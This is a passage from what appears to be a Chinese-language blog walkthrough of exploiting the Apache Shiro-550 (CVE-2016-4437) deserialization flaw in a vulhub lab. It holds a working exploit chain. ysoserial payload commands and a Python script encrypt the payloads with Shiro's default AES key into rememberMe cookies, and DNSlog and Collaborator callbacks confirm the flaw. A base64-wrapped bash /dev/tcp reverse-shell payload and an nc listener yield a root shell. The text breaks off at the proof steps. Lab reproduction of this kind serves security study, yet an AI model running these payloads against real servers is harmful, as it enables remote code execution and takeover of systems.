+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> ysoserial.jar /home/kali/vulhub/shiro/CVE-2016-4437/</span><br><span class="line"><span class="built_in">cd</span> /home/kali/vulhub/shiro/CVE-2016-4437/</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376780400_mj7vwq.webp" loading='lazy'></p>
+<h3 id="Q2：为什么要用DNSlog验证？"><a href="#Q2：为什么要用DNSlog验证？" class="headerlink" title="Q2：为什么要用DNSlog验证？"></a>Q2：为什么要用DNSlog验证？</h3><p>Shiro550属于无回显命令执行</p>
+<ol>
+<li>执行命令的结果不会直接返回在网页响应里，看页面看不出是否执行成功；</li>
+<li>ping请求会触发DNS查询，这个请求会主动外带流量到dnslog平台；</li>
+<li>DNS请求不会受web页面回显限制，只要命令执行成功就一定会留下记录；</li>
+<li>简单、轻量，不需要搭建额外服务器，比赛靶场最通用的验证手段。</li>
+</ol>
+<hr>
+<h3 id="方案一：DNSlog"><a href="#方案一：DNSlog" class="headerlink" title="方案一：DNSlog"></a>方案一：DNSlog</h3><h4 id="2-1-获取DNSlog子域名"><a href="#2-1-获取DNSlog子域名" class="headerlink" title="2.1 获取DNSlog子域名"></a>2.1 获取DNSlog子域名</h4><p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
+<p>访问 dnslog.cn，页面提供专属域名。</p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376781902_cqg846.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376783686_ejv0rj.webp" loading='lazy'></p>
+<blockquote>
+<p>原理：只要靶机执行了<code>ping xxx.dnslog.cn</code>，靶机会发起DNS解析请求；dnslog平台会记录这条解析记录。<br>优势：无回显RCE首选。很多Shiro靶场命令执行没有页面回显，浏览器页面看不出任何变化，但DNS请求是一定会向外发的。</p>
+</blockquote>
+<hr>
+<h4 id="2-2-ysoserial生成恶意序列化payload"><a href="#2-2-ysoserial生成恶意序列化payload" class="headerlink" title="2.2 ysoserial生成恶意序列化payload"></a>2.2 ysoserial生成恶意序列化payload</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar URLDNS <span class="string">"http://h0l1vh.dnslog.cn"</span> &gt; payload.bin</span><br></pre></td></tr></tbody></table></figure>
+
+<p>验证：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376785151_48tx48.webp" loading='lazy'></p>
+<hr>
+<h4 id="2-3-创建-shiro-加密脚本-shiro-enc-py"><a href="#2-3-创建-shiro-加密脚本-shiro-enc-py" class="headerlink" title="2.3 创建 shiro 加密脚本 shiro_enc.py"></a>2.3 创建 shiro 加密脚本 shiro_enc.py</h4><p>用Shiro默认密钥做AES-CBC加密+Base64编码</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cat &gt; shiro_enc.py &lt;&lt;<span class="string">'EOF'</span></span><br><span class="line"><span class="keyword">import</span> base64, os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    pad_len = <span class="number">16</span> - <span class="built_in">len</span>(data) % <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> data + <span class="built_in">bytes</span>([pad_len]) * pad_len</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shiro_encrypt</span>(<span class="params">payload_bytes</span>):</span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv=iv)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(iv + cipher.encrypt(pad(payload_bytes))).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"payload.bin"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"rememberMe="</span> + shiro_encrypt(f.read()))</span><br><span class="line">EOF</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376786792_jpnq42.webp" loading='lazy'></p>
+<p>安装 pycryptodome（AES 加密依赖）</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pycryptodome</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376788828_7nwmn7.webp" loading='lazy'></p>
+<p> 触发保护机制：<strong>不允许直接用 pip 往系统 Python 里装包</strong></p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建虚拟环境</span></span><br><span class="line">python3 -m venv venv</span><br><span class="line"><span class="comment"># 进入虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> venv/bin/activate</span><br><span class="line"><span class="comment"># 在虚拟环境安装库</span></span><br><span class="line">pip3 install pycryptodome</span><br><span class="line"><span class="comment"># 运行脚本</span></span><br><span class="line">python3 shiro_enc.py</span><br><span class="line"><span class="comment"># 退出虚拟环境</span></span><br><span class="line">deactivate</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376790269_ae8xf9.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376791740_t9swxc.webp" loading='lazy'></p>
+<p>rememberMe=RFLFhERJIlVtq+EPP3d5Upb3E0ZYt7oGZdxoXLm1OzfBWCo36MHiDdXro1VUkUnjWAsC/R5NM6rngu/6IseGlvJRNWBe7wqtywfvqZmmt64bFZQl2QBWMg2j4c0z1pQO7h/O9FlmBYc486etcvlTZOjyHWeqaZdKYoKIHsgf2RqUVTdO1YRv6pedv5lkpRkMx6zng7Osj/T1xfbTXFB5RlOTFcPPcmqPsQpDNnIrNzGgod+qm0zuL+rr+SV6yNovJGqWIECs8KW8D+OFeBxufjEhUMNdf1q1E1Cg1kUc6oBm9a6smXUxM9efMFP3TilXJcdizLONeCw+XROk/9lwGiMYlsrijsmhKdUtnj09XYCT8ToJKqNpLEH2l6ABMw6XF+NhO8sfnZ2JPMqHNzZ3sA==</p>
+<hr>
+<h4 id="2-4-Burp修改Cookie发包"><a href="#2-4-Burp修改Cookie发包" class="headerlink" title="2.4 Burp修改Cookie发包"></a>2.4 Burp修改Cookie发包</h4><ol>
+<li>浏览器打开靶场页面，用 Burp 抓正常访问请求<code>http://192.168.23.151:8080</code></li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376793481_jfy7c0.webp" loading='lazy'></p>
+<ol start="2">
+<li>在请求头<code>Cookie</code>里添加刚刚生成的一串；保留<code>JSESSIONID</code>不变</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376795412_r6e54y.webp" loading='lazy'></p>
+<p>改成：</p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376797905_tgm8ej.webp" loading='lazy'></p>
+<hr>
+<ol start="4">
+<li>回到dnslog页面刷新查看记录</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376800337_9gl1vp.webp" loading='lazy'></p>
+<ul>
+<li>✅ 出现记录：漏洞确认存在！目标Shiro版本≤1.2.4，并且没有修改默认AES密钥</li>
+<li>❌ 没有任何记录：默认密钥无效。两种可能性：版本&gt;=1.2.5 / 管理员更换了自定义密钥。</li>
+</ul>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376802604_t14hie.webp" loading='lazy'></p>
+<hr>
+<h3 id="方案二：Burp-专业版，自带-Collaborator"><a href="#方案二：Burp-专业版，自带-Collaborator" class="headerlink" title="方案二：Burp 专业版，自带 Collaborator"></a>方案二：Burp 专业版，自带 Collaborator</h3><p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376804309_uzek8a.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376806100_k42spc.webp" loading='lazy'></p>
+<p>得到子域名：1prfmws3ghfx6zz5c174av5e258wwnkc.oastify.com</p>
+<p>每点一次会生成一个新域名，前后不一致就收不到了。复制一次，从头用到尾。</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/kali/vulhub/shiro/CVE-2016-4437</span><br><span class="line">java -jar ysoserial.jar URLDNS <span class="string">'http://1prfmws3ghfx6zz5c174av5e258wwnkc.oastify.com'</span> &gt; payload.bin</span><br><span class="line">python3 shiro_enc.py</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376807685_o4maa2.webp" loading='lazy'></p>
+<p>rememberMe=fMqsEL17K/RYnoFRpDWAgeRfmVq+6qrrtVzHPRymFaQuXHRjhBPumDSuC7I+TPi7AA3Io1M5QF0OM8mWSjbH+H4QfTWNWOpfd8gOKmbilplNzILimz0YZMhUlKnmuXfKqO+4fckq4BKKdIFbpaooFEalWNwLa+bV39zwNsfyHR9YKp8HowvN+FvV5CQ324uVBimm9XPqzBO1h/lakbFCVpSBal/dWaC3AwU/t8LquwjCcjU540Mw1WXgavxkIQOPHisSuvXjkZOGZU24N/LV1zJO8LP9Ay+/sI0E7Rsn3HZRDHMY1gTsGnHvpUTuJqdcufZrjo1O7TNAhhfI7V0Xy2GFMb65PTzY9/UXK8uJ2CZbdCChgt2CGLb+/Ew04np5ZDeJG1G/Ql/1IA9Ux4U71wm+d++sJn7x1/ml51uEL8REg+IEs4vWoNUsl6Ec0G6Z8zjjeoDVhflJ6xqS6n6D/lx7fCu+k3AjK6bfo/PeK6o=</p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376809921_wl2903.webp" loading='lazy'></p>
+<p>回 Collaborator 标签 → 点「立即轮询」</p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376812291_7e537v.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376814139_nank09.webp" loading='lazy'></p>
+<p>漏洞确认成功了</p>
+<hr>
+<h2 id="3-3-漏洞利用"><a href="#3-3-漏洞利用" class="headerlink" title="3.3 漏洞利用"></a>3.3 漏洞利用</h2><h3 id="3-3-0-确定合适的-Gadget-利用链"><a href="#3-3-0-确定合适的-Gadget-利用链" class="headerlink" title="3.3.0  确定合适的 Gadget 利用链"></a>3.3.0  确定合适的 Gadget 利用链</h3><p>通过 URLDNS 确认漏洞入口与密钥有效后，此时尚未获取目标服务器权限，无法查看后端环境信息，只能尝试多条可用 Gadget 链进行测试。  </p>
+<p>CC1、CC5 对 JDK 版本限制较强，容易执行失败；CC6 的 JDK 兼容范围更广，优先选用 CC6 构造载荷，使用<code>sleep</code>命令做时间差验证系统命令执行。  </p>
+<hr>
+<h3 id="3-3-1-Sleep-时间差验证"><a href="#3-3-1-Sleep-时间差验证" class="headerlink" title="3.3.1 Sleep 时间差验证"></a>3.3.1 Sleep 时间差验证</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">"sleep 10"</span> &gt; payload.bin</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h3 id="3-3-2-AES加密，生成rememberMe的Cookie值"><a href="#3-3-2-AES加密，生成rememberMe的Cookie值" class="headerlink" title="3.3.2 AES加密，生成rememberMe的Cookie值"></a>3.3.2 AES加密，生成rememberMe的Cookie值</h3><p>用之前的python脚本读取<code>payload.bin</code>，AES-CBC加密+base64编码，输出cookie值</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro_enc.py </span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376816782_avejwk.webp" loading='lazy'></p>
+<p>rememberMe=ArAUCJP766RmTP4TiGkW8GTVynH9VZes7FCSyhj60XPJ/SbxSIEbzZw6qS0KvBDPkIWy0fA9bQkqvu2IKsDHQRkPFm1kCxg1cbvEEg1FzthJ0hA6fjfKP3TdaBFCAg6XmwTSO7FEE79Fb2v9XWXI7yQ2NCtSfRq4BpTCaUTh7mKZZPAU7Mi80/yQAGLuEp7NtGo/TN/Abi6ILSCWm9nGFwtrbg9Rq06DhwiP4x84Wy1x0MDRTLUDtIuvqIiki4rdmBfYLKhlV5UcG3PVkBxKsFgbmuyEt6gW0ivivlHhHoIIk+ZttfrDlWxrBX+Vkbj35EYWONh7seVr8o9L9f+utER+TUqtQXGBfYjlresgirPMZGBKM7xiTpNl4a4do5q/ctETulBLLMwctbMqaXrw6A9TO37eYzIxTkXsnYOFRb+OyinVcXoDlEQ6GB/opeQuO+/Z2BqlNAbtwXkzVA1MJ5NH+aOfbgtG8VGM3FdZ3xh1BmiNO3LIrGQbB3QVRyUusEmGAuM1sJ0yDu4IfR1hpHrG9ui/grYmID64oK8sZkN6pIX6K0FCC4nAF6rOFOcbvXnjefpJlOv0HXeVgKPUw+r1VQ1ymyxL3OG96Kc6FH2Zq3U1KecWqXWlq7Qnjayb5yRkoRAbcH7mQWWPxnVNOdlMOBreNNB/fYZkMGjBookI8pZU2nVTRhJJAjqD36WLUCe9OwPmowvI3mcJ525zeJIe0X31TvveZjeNCUGg5r/9FRIQCu80pliJXC7v03N4Gp/jpbq1zBRRWrDdy6NbZNp2I82VaADODMDEktTS7J3mpHH1zawnE9U8be9Wc51gAApWluhmV1aoEXMxnYYST6YWB8OAzNqOTGvxxmQB6vIrPzL2+t+kdk1EYY9olncluGJ6Rsje48twwRRUW5A4oXzMxVYJ1xS4zlCy27igvtFUbHhOaA+3kGkSnGZpM5vslO2MqCiPs6KhNiYHdiMfNsEAhx0NuouEl9CoBsfd67X0CWm2NLDsYB8A/qNtb+a7p10Lsu7u66ZrC0azkrD9XywOlSW1u8sJTAbelpGhysZsxuBY4+HoOOtigXg+PpaLQmLaL48sCX97e6Mr974lXzxcsgUP1DWp51TqGnnr6qKPx4PT1ljXkuLza82RnOAF2eisKuGG9M9ZP0Asfh93ADpALiKDnMsxvebQhCZm3RQiF41Y+KE6MX0jYAmJama9TBEREYkKAKLiLsS+Dhhfm0jPAjC2+K6rzDEqNqMFvvG9RG5CvAj87RCsNaiZTPPWDtgbWVwHnTSomEdc0I0gn1UWsdcAqg7Y3iTWbZqbhnFXw2WR8vnN/3ADrVSj4Dy16eMZZaeo/HuEfJ0dyLpJ/QVXdHyO/b5a0jFE/R7bCb8rtEoawCH7y2oX4S+wOQB+Be+mEMt+R0VzJ6aM3Q/nVEjTg1/16DKDnoF1Xo3keAOSJoHzM1zuV+ecKRa+nTNt36v19lfkBpT4QgQJhiwSaC26Kk6RKEGaLsKkKzzkYN/kLY1BurjLMbusuC1k7mdN4CM3k88+Iac6bbfvB72RSpuMqF2arj7CYpN4OC1xNhrg6rRGah5s1mdgGpa2a5Q8+i/lKmMJwohF1LxJG2H/LqeqxpIC53vT2HFBFZ00a0A+YoXal5WKcekXrZPIjMj35Ou8XGNPOWBU2hXsinTnmKu+WYr1w8yGnhWF1kombOMZcptfuiCD9KphpGW7/KoBBAScxQZzo+8yhpUkeyS4NQ==</p>
+<hr>
+<h3 id="3-3-3-Burp-Suite构造请求发包"><a href="#3-3-3-Burp-Suite构造请求发包" class="headerlink" title="3.3.3 Burp Suite构造请求发包"></a>3.3.3 Burp Suite构造请求发包</h3><ol>
+<li>抓靶站的普通GET请求（首页即可，<strong>不需要登录包</strong>）</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376818863_p5g1j4.webp" loading='lazy'></p>
+<ol start="2">
+<li>在请求头<code>Cookie</code>字段增加</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376821047_ni2c9s.webp" loading='lazy'></p>
+<ol start="3">
+<li>发送数据包。</li>
+</ol>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376823370_n4th9m.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376825516_r1upy5.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376827285_kumab1.webp" loading='lazy'></p>
+<blockquote>
+<p>对照组正常访问<code>/login</code>，请求等待耗时仅 43ms；携带构造完成的 rememberMe 恶意 Cookie 发起请求时，请求等待耗时达到 34.42 秒，出现显著延迟，证明载荷成功触发 Shiro 反序列化漏洞，服务端执行了<code>sleep</code>系统命令，远程代码执行验证成功。  </p>
+</blockquote>
+<hr>
+<h3 id="3-3-4-生成反弹命令的-base64"><a href="#3-3-4-生成反弹命令的-base64" class="headerlink" title="3.3.4 生成反弹命令的 base64"></a>3.3.4 生成反弹命令的 base64</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">"bash -i &gt;&amp; /dev/tcp/192.168.23.151/4444 0&gt;&amp;1"</span> | <span class="built_in">base64</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376829015_2qgt6k.webp" loading='lazy'></p>
+<p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzLjE1MS80NDQ0IDA+JjE=</p>
+<hr>
+<h3 id="3-3-5-生成-payload"><a href="#3-3-5-生成-payload" class="headerlink" title="3.3.5 生成 payload"></a>3.3.5 生成 payload</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 <span class="string">"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzLjE1MS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}"</span> &gt; payload.bin</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>bash -c "{echo,Base64串}|{base64,-d}|{bash,-i}"</code></p>
+<p><code>-i</code>：interactive，交互式 bash，也就是我们反弹 shell 用的交互式 shell。  </p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376830615_j7u2or.webp" loading='lazy'></p>
+<hr>
+<h3 id="3-3-6-加密"><a href="#3-3-6-加密" class="headerlink" title="3.3.6 加密"></a>3.3.6 加密</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro_enc.py</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376832289_8yins3.webp" loading='lazy'></p>
+<p>rememberMe=Fn53D8+CB2CIg8/IuYRk2JLulpuecSpzrJCfWAwSJ8aOZ3Yfm6cjA74v5pWKFbuGHRq30OwLzzDKVUZw7rFaqJSBRDNuEvLlqjZdcJ3iYtdM3Onz1dlmWJ4bCHyHZe1crE/wcBkxsSTYqM7ro86DhSQPo34+p5E8Ci6Ksex4BUf3WWU2VURu7kt6QR6mBum8s56rTHljUuPZ1PCpYogKvyIsuRAMhzUuZC4sCkrmMC7gt+ImDRmyM3Ja1GGXvOrNAnwolvYhVPIaYZSWrhJx7EwyizEZ6qx3iSsGjr7WAYQSOLzfuVb1qIWmlMIEsO9LorgSKHhIpkEfi8Vto8kDUHxmmApimpv9hW/u92ySb4PEKWli/77V8cKx9U7K8raXhItr2Uv1V/qO61yjRJeL7sbeKZwYJhxOcOs2Lhqnu4OCBc0lW5+zmV4lExekXHN2ceCnwV9nioCBE7u9B3KJ/rsLWMYDFJXu8WodVHsooCWedzQWfDe5ewSY6xITrgrPF1wvX1/dJBZ6k9v8m+bz/xUeoLx1TAUaSPcozKFyxMYmAXMQ1qIW2k11Hm6AktzGHGY2XZxoLkedVKEm/et6jDaoDsVeSOTLx5GdhflOBzLb/5kp7vlYXbR0BYZW3NH5RHRN/cK+L6Zq7PLwbMxesDL3p6N+gXMmY5VtVoUQWglP109fDXBzJQhrKT8wXa+nCFP8AxUQyV8gWxA3JeXeqdxpLs39sVu2gFWnIx0u3GOnC6tXeWCpIMd+4W3TVYNOUR/AKDm94SJVD388vHdUNQgvSTQ5KRXtzpYvhWJOFcFwF2ktSlF6eR2vlL89YG4wsV1Ba28lNocl+oIxmRGj7sKW99icgTrTOEKWCod9gqr7sfhGijTsArjxCkMlZcYrVKvE3SsPMB28omAQn1K9QylGpVFwAfOQvZuDZ+LpL86Qe6f3nfUFROgelhO/VXGOi9rFjup/dcaDLqGVsDPiTfCKYnx19E5NCaInmzX++EwmPItdcnPfs6A0yTdeWMmpMdlHIKPEVPCFre7qHgJZyHQGJybCAViddb4JsYY/2spSOPAa5Z8suYn4zNMHLzQpZtOncmEKH24pokSCrWPvzV2x9eGsTcMssNux9QbbzIv11qW1RWPdwgMxyvVFx7jfAYzVPBRe4PrCWEHptivb2FvZuiTg5MBcGqnUIK0lcLGGp8bw3X/+VnjgwD/v4RBHnzWq6qX/dqwv/Epc5eaTCNEBTX1CuLIbnFbQ1DjKOsxLZuUlmQD1qc2nACMKMCmIHsGd6pt9BGqXv3ch008NPExFK0pLZAWHxumLyjDAfK47XXwdOUBITl7an6ko6AHKbk7znapENw9ghLCYw5Qx3pBMcknLferrH/TlwsxUOAR/NMAHmCyHpAc2U5fHVcpVo5S8MzlPmu9Ip220ykRw5XyQZTzwI6949cl2gplcFXiX4DYvE22K+pBUXpH5n7LEIvdWU3ablXiSmnhj4NNJD5PmiPjhbJMVbxWrYVNBDvq1mT30MZdLHSQw83Y4VjsZok34h/vPvJgtTGD3B1ekQ8ieWd0BISB5fkn9YtqtzTop9QqC/MITHkBy8X4CCDmdlXKpQHJ/PlCI1hih6uX4qM7ZdNxXBkfBlsVVWKtBtb41vqE7tdpaBO8PHPtvKjV71p9oIIFwNV5dx7BT4Dofr03Lp3dY6AyXsekSPM9MWSObky3DuK2y2Uq3FVsEzlCLXsBUj81GRsnoVCzgD32FY8+SxAgQpolLEvGc7jka3zJTr6CO01bNR9kLOtBxibVcyy9ygNpyxFFOaevcwLtikMWwmAc9XgKv4yPCoX91Q0Vy22kOnTKPjlfXPwqHYON5</p>
+<hr>
+<h3 id="3-3-7-开启监听"><a href="#3-3-7-开启监听" class="headerlink" title="3.3.7 开启监听"></a>3.3.7 开启监听</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></tbody></table></figure>
+
+<hr>
+<h3 id="3-3-8-bp-发包"><a href="#3-3-8-bp-发包" class="headerlink" title="3.3.8 bp 发包"></a>3.3.8 bp 发包</h3><p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376835040_pxnncn.webp" loading='lazy'></p>
+<hr>
+<h3 id="3-3-9-拿到-shell"><a href="#3-3-9-拿到-shell" class="headerlink" title="3.3.9 拿到 shell"></a>3.3.9 拿到 shell</h3><p>返回终端发现，已经拿到了容器 root shell</p>
+<p><img src="https://img.jasmine-iris.top/posts/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1789376837370_7x5b23.webp" loading='lazy'></p>
+<hr>
+<h2 id="3-4-证明"><a href="#3-4-证明" class="headerlink" title="3.4 证明"></a>3.4 证明</h2><p>拿到 shell 后，需要证明这个 shell 确实来自那个 Shiro容器。</p>
+<h3 id="3-4-1-身份证明"><a href="#3-4-1-身份证明" class="headerlink" title="3.4.1 身份证明"></a>3.4.1 身份证明</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="3-4-2-定位证明–容器-ID"><a href="#3-4-2-定位证明–容器-ID" class="headerlink" title="3.4.2 定位证明–容器 ID"></a>3.4.2 定位证明–容器 ID</h3><p> 在拿到的 shell 里面  </p>
